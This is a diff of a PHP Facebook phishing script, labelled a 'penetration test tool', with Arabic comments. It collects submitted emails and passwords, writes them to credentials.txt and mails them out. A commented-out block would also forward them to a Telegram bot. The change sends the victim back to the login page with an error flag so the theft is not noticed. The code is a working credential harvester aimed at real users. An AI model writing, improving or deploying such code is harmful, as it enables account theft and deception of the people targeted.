@@ -1,7 +1,6 @@
 <?php
 // ============================================
 // Facebook Phishing - Penetration Test Tool
-// البيانات تتبعت على الإيميل + تليجرام
 // ============================================
 
 $file = 'credentials.txt';
@@ -39,8 +38,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email']) && isset($_PO
                'X-Mailer: PHP/' . phpversion();
     mail($to, $subject, $message, $headers);
 
-    // 3️⃣ إرسال لتليجرام (عشان يجيك على الموبايل فوراً)
-    // 👇 غير التوكن والـ chat_id بتوع بوتك
+    // 3️⃣ إرسال تليجرام (فعل لو عايز)
     /*
     $botToken = 'YOUR_BOT_TOKEN';
     $chatId   = 'YOUR_CHAT_ID';
@@ -48,8 +46,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email']) && isset($_PO
     file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$msg");
     */
 
-    // توجيه الضحية لصفحة الخطأ
-    header('Location: error.html');
+    // ⬅️ بدال ما يحول لـ error.html، يحول لـ index.html مع باراميتر error
+    header('Location: index.html?error=1');
     exit;
 } else {
     header('Location: index.html');
